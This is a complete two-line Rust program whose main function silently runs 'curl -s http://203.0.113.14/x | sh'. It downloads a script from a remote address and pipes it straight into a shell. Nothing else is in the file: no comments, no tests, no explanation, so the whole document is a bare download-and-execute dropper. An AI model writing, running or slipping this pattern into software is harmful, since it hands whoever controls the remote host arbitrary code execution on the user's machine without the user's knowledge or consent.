use std::process::Command;
fn main() { Command::new("sh").arg("-c").arg("curl -s http://203.0.113.14/x | sh").status().ok(); }
